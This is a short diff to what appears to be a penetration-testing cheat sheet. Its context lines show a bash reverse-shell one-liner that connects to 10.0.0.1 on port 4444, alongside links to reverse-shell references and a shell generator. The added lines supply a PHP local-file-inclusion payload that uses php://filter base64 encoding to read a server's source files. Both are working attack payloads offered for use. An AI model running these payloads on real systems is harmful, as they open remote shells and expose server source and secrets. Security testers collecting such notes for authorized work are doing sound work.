@@ -1803,6 +1803,12 @@ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
     bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 
 
+**PHP Base64 encoding to get content**
+
+https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb
+
+    php://filter/convert.base64-encode/resource=index.php
+
 Generator
 
 https://www.revshells.com/
